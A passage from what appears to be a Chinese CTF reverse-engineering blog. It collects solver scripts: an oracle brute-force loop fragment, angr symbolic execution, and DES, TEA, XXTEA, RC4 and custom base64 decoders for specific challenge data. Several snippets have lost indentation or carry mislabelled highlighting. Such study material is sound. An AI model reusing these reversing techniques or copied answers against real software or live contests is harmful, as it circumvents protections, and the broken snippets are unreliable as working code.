class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = <span class="built_in">int</span>(io.recv(<span class="number">2</span>))</span><br><span class="line">        io.close()              </span><br><span class="line">        <span class="keyword">if</span> n == b + <span class="number">1</span>:          </span><br><span class="line">            a = a + i</span><br><span class="line">            b = b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="将数据-0FD370FEB59C9B9Eh-转化为可识别字符串"><a href="#将数据-0FD370FEB59C9B9Eh-转化为可识别字符串" class="headerlink" title="将数据(0FD370FEB59C9B9Eh)转化为可识别字符串"></a>将数据(0FD370FEB59C9B9Eh)转化为可识别字符串</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cstring&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    unsigned long long s[] = &#123;</span><br><span class="line">        <span class="number">0xFD370FEB59C9B9E</span>,</span><br><span class="line">        <span class="number">0xDEAB7F029C4FD1B2</span>,</span><br><span class="line">        <span class="number">0xFACD9D40E7636559</span>,</span><br><span class="line">        <span class="number">0x4</span>,</span><br><span class="line">        <span class="number">0x0</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">int</span> c = (<span class="built_in">int</span>) * ((unsigned char *) (s) + i);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\\x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; c;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="angr符号执行"><a href="#angr符号执行" class="headerlink" title="angr符号执行"></a>angr符号执行</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;D:\\桌面\\attachment1&#x27;</span>, load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">f = p.factory</span><br><span class="line">state = f.entry_state(addr=<span class="number">0x400605</span>)  <span class="comment"># 设置state开始运行时的地址</span></span><br><span class="line">flag = claripy.BVS(<span class="string">&#x27;flag&#x27;</span>, <span class="number">8</span> * <span class="number">32</span>)  <span class="comment"># 要求的内容有32个，用BVS转成二进制给flag变量</span></span><br><span class="line">state.memory.store(<span class="number">0x603055</span> + <span class="number">0x300</span> + <span class="number">5</span>, flag)  <span class="comment"># 因为程序没有输入，所以直接把字符串设置到内存</span></span><br><span class="line">state.regs.rdx = <span class="number">0x603055</span> + <span class="number">0x300</span></span><br><span class="line">state.regs.rdi = <span class="number">0x603055</span> + <span class="number">0x300</span> + <span class="number">5</span>  <span class="comment"># 然后设置两个寄存器</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(state)  <span class="comment"># 准备从state开始遍历路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ready&quot;</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)  <span class="comment"># 遍历到成功的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sucess&quot;</span>)</span><br><span class="line">    x = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="DES算法在CBC模式下解密一个Base64编码的字符串"><a href="#DES算法在CBC模式下解密一个Base64编码的字符串" class="headerlink" title="DES算法在CBC模式下解密一个Base64编码的字符串"></a>DES算法在CBC模式下解密一个Base64编码的字符串</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">d_flag = <span class="string">b&#x27;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;1\x002\x003\x004\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">generator = DES.new(key, DES.MODE_CBC, iv=key)</span><br><span class="line">flag = generator.decrypt(base64.b64decode(d_flag))</span><br><span class="line"><span class="built_in">print</span>(flag.decode(<span class="string">&#x27;utf-16&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h2 id="tea的解密脚本"><a href="#tea的解密脚本" class="headerlink" title="tea的解密脚本"></a>tea的解密脚本</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_dec</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];  <span class="comment">// v0、v1分别是密文的左、右半部分</span></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">1166789954</span>;    <span class="comment">//作为sum每次累加的变化值，题目中往往会修改此值</span></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">64</span> * delta; </span><br><span class="line">	<span class="type">int</span> i;     <span class="comment">//题目中的tea加密轮数为64轮，因此解密时要做出对应的修改，最终sum是64倍的delta</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;  <span class="comment">// tea加密进行64轮</span></span><br><span class="line">        <span class="comment">//根据加密时的顺序颠倒下面3行的顺序，将加法改为减法（异或部分都是整体，不用管），就是逆向解密过程</span></span><br><span class="line">        v1 -= (v0 + sum + <span class="number">20</span>) ^ ((v0 &lt;&lt; <span class="number">6</span>) + k[<span class="number">2</span>]) ^ ((v0 &gt;&gt; <span class="number">9</span>) + k[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">        v0 -= (v1 + sum + <span class="number">11</span>) ^ ((v1 &lt;&lt; <span class="number">6</span>) + k[<span class="number">0</span>]) ^ ((v1 &gt;&gt; <span class="number">9</span>) + k[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解密后的内容要还给v数组</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="xxtea的解密脚本"><a href="#xxtea的解密脚本" class="headerlink" title="xxtea的解密脚本"></a>xxtea的解密脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">_DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_long2str</span>(<span class="params">v, w</span>):</span><br><span class="line">    n = (<span class="built_in">len</span>(v) - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> w:</span><br><span class="line">        m = v[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> (m &lt; n - <span class="number">3</span>) <span class="keyword">or</span> (m &gt; n): <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 返回空字节串</span></span><br><span class="line">        n = m</span><br><span class="line">    s = struct.pack(<span class="string">&#x27;&lt;%iL&#x27;</span> % <span class="built_in">len</span>(v), *v)</span><br><span class="line">    <span class="keyword">return</span> s[<span class="number">0</span>:n] <span class="keyword">if</span> w <span class="keyword">else</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_str2long</span>(<span class="params">s, w</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(s)</span><br><span class="line">    m = (<span class="number">4</span> - (n &amp; <span class="number">3</span>) &amp; <span class="number">3</span>) + n</span><br><span class="line">    <span class="comment"># 确保s是字节串</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">        s = s.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 如果s是str类型，则转换为字节串</span></span><br><span class="line">    s = s.ljust(m, <span class="string">b&#x27;\0&#x27;</span>)  <span class="comment"># 使用字节串填充</span></span><br><span class="line">    v = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;%iL&#x27;</span> % (m &gt;&gt; <span class="number">2</span>), s))</span><br><span class="line">    <span class="keyword">if</span> w: v.append(n)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">s, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s: <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 如果输入为空，则返回空字节串</span></span><br><span class="line">    v = _str2long(s, <span class="literal">True</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">&#x27;\0&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="literal">False</span>)  <span class="comment"># 确保密钥也是字节串</span></span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> + _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n] = (v[n] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[n &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        z = v[n]</span><br><span class="line">        q -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">s, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s: <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 如果输入为空，则返回空字节串</span></span><br><span class="line">    v = _str2long(s, <span class="literal">False</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">&#x27;\0&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="literal">False</span>)  <span class="comment"># 确保密钥也是字节串</span></span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sum</span> = (q * _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">sum</span> != <span class="number">0</span>:</span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        z = v[n]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[<span class="number">0</span> &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> - _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert hex string to bytes</span></span><br><span class="line">dec = <span class="string">&#x27;bca5ce40f4b2b2e7a9129d12ae10c85b3dd7061ddc70f8dc&#x27;</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &gt;= <span class="number">3</span>:</span><br><span class="line">    dec_bytes = <span class="built_in">bytes</span>.fromhex(dec)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    dec_bytes = binascii.unhexlify(dec)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">dec2 = decrypt(dec_bytes, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(dec2))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(dec2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))  <span class="comment"># 尝试将结果解码为UTF-8字符串，如果失败则替换不可解码的字符</span></span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to decode the decrypted bytes as UTF-8.&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="rc4解密脚本"><a href="#rc4解密脚本" class="headerlink" title="rc4解密脚本"></a>rc4解密脚本</h2><h3 id="c语言"><a href="#c语言" class="headerlink" title="c语言"></a>c语言</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化S盒</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_init</span><span class="params">(<span class="type">uint8_t</span> S[<span class="number">256</span>], <span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">int</span> keylen)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        j = (j + S[i] + key[i % keylen]) % <span class="number">256</span>;</span><br><span class="line">        <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">        <span class="type">uint8_t</span> temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密（RC4加密和解密过程相同）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">int</span> keylen, <span class="type">uint8_t</span> *data, <span class="type">int</span> datalen)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> S[<span class="number">256</span>];</span><br><span class="line">    RC4_init(S, key, keylen);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; datalen; ++n) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">        <span class="type">uint8_t</span> temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint8_t</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">        data[n] ^= S[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义密钥为一个字节数组，而不是字符串</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> key[] = &#123;<span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x40</span>&#125;;  <span class="comment">// 替换为你的密钥</span></span><br><span class="line">    <span class="type">int</span> keylen = <span class="keyword">sizeof</span>(key) / <span class="keyword">sizeof</span>(key[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例加密数据</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> encrypted_data[] = &#123;</span><br><span class="line">        <span class="number">0x76</span>, <span class="number">0x35</span>, <span class="number">0xFD</span>, <span class="number">0xF5</span>, <span class="number">0x7D</span>, <span class="number">0x47</span>, <span class="number">0xFE</span>, <span class="number">0x95</span>,</span><br><span class="line">        <span class="number">0x13</span>, <span class="number">0x7A</span>, <span class="number">0x26</span>, <span class="number">0x59</span>, <span class="number">0x3F</span>, <span class="number">0xFF</span>, <span class="number">0x31</span>, <span class="number">0xA1</span>,</span><br><span class="line">        <span class="number">0x85</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x02</span>, <span class="number">0x6E</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0x6A</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x4D</span>, <span class="number">0x8D</span>, <span class="number">0xD7</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x2D</span>, <span class="number">0x5E</span>,</span><br><span class="line">        <span class="number">0xCC</span>, <span class="number">0x62</span>, <span class="number">0xF2</span>, <span class="number">0xDF</span>, <span class="number">0xE5</span>, <span class="number">0xD2</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> encrypted_data_len = <span class="keyword">sizeof</span>(encrypted_data) / <span class="keyword">sizeof</span>(encrypted_data[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个副本用于解密，并留出空间给字符串终止符</span></span><br><span class="line">    <span class="type">uint8_t</span> decrypted_data[encrypted_data_len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(decrypted_data, encrypted_data, encrypted_data_len);</span><br><span class="line">    decrypted_data[encrypted_data_len] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 添加字符串终止符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行解密操作</span></span><br><span class="line">    RC4_decrypt(key, keylen, decrypted_data, encrypted_data_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出解密后的数据（以十六进制格式）</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data in hex: &quot;</span>);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; encrypted_data_len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, decrypted_data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出解密后的数据（以字符串格式），仅当解密后是有效文本时才这么做</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data as string: %s\n&quot;</span>, decrypted_data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rc4解密脚本：（python）</span><br><span class="line"><span class="number">1.</span></span><br><span class="line">from Crypto.Cipher import ARC4</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def <span class="title function_">rc4_decrypt</span><span class="params">(data, key)</span>:</span><br><span class="line"># 解密前先进行Base64解码</span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line"># 将密钥转换为字节</span><br><span class="line">key = bytes(key, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"># 创建ARC4解密对象</span><br><span class="line">enc = ARC4.new(key)</span><br><span class="line"># 解密数据</span><br><span class="line">res = enc.decrypt(data)</span><br><span class="line"># 将解密后的数据转换为字符串</span><br><span class="line">res = str(res, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"># 加密后的数据</span><br><span class="line">encrypted_data = <span class="string">&#x27;加密后的数据&#x27;</span></span><br><span class="line"># 解密密钥</span><br><span class="line">key = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"># 解密数据</span><br><span class="line">decrypted_data = rc4_decrypt(encrypted_data, key)</span><br><span class="line">print(<span class="string">&#x27;解密后:&#x27;</span>, decrypted_data)</span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rc4</span>(<span class="params">key, ciphertext</span>):</span><br><span class="line">    cipher = ARC4.new(key)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 替换为你的密钥和要解密的密文</span></span><br><span class="line">    key = <span class="string">b&#x27;your-encryption-key&#x27;</span></span><br><span class="line">    encrypted_data = <span class="string">b&#x27;your-encrypted-data&#x27;</span></span><br><span class="line"></span><br><span class="line">    decrypted_data = decrypt_rc4(key, encrypted_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted data:&quot;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rc4</span>(<span class="params">key, ciphertext</span>):</span><br><span class="line">    cipher = ARC4.new(key)</span><br><span class="line">    <span class="comment"># 确保ciphertext是bytes类型</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(ciphertext, <span class="built_in">list</span>):</span><br><span class="line">        ciphertext = <span class="built_in">bytes</span>(ciphertext)  <span class="comment"># 将整数列表转换为bytes类型</span></span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 替换为你的密钥和要解密的密文</span></span><br><span class="line">    key = <span class="string">b&#x27;[Warnning]Access_Unauthorized&#x27;</span></span><br><span class="line">    encrypted_data = [<span class="number">0xC3</span>, <span class="number">0x82</span>, <span class="number">0xA3</span>, <span class="number">0x25</span>, <span class="number">0xF6</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x3B</span>, <span class="number">0x59</span>, <span class="number">0xCC</span>, <span class="number">0xC4</span>, <span class="number">0xE9</span>, <span class="number">0xF1</span>, <span class="number">0xB5</span>, <span class="number">0x32</span>, <span class="number">0x18</span>,</span><br><span class="line">                      <span class="number">0xB1</span>, <span class="number">0x96</span>, <span class="number">0xAE</span>, <span class="number">0xBF</span>, <span class="number">0x08</span>, <span class="number">0x35</span>]</span><br><span class="line"></span><br><span class="line">    decrypted_data = decrypt_rc4(key, encrypted_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted data in hex: &quot;</span>, binascii.hexlify(decrypted_data).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 如果你知道解密后的数据是文本，则可以尝试这样打印</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decrypted data as string: &quot;</span>, decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decrypted data is not valid UTF-8 text.&quot;</span>)</span><br></pre></td></tr></table></figure>





<h2 id="base64无表魔改解码脚本"><a href="#base64无表魔改解码脚本" class="headerlink" title="base64无表魔改解码脚本"></a>base64无表魔改解码脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=[<span class="number">0x5a</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x44</span>,<span class="number">0x7C</span>, <span class="number">0x66</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>, <span class="number">0x56</span>,<span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>,<span class="number">0x55</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x67</span>,<span class="number">0x4C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x5A</span>, <span class="number">0x70</span>,<span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x5C</span>,<span class="number">0x76</span>, <span class="number">0x5A</span>, <span class="number">0x45</span>, <span class="number">0x3D</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">4</span>):</span><br><span class="line">    flag+=<span class="built_in">hex</span>((((data[i]-<span class="number">0x3D</span>)&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">2</span>)|(((data[i+<span 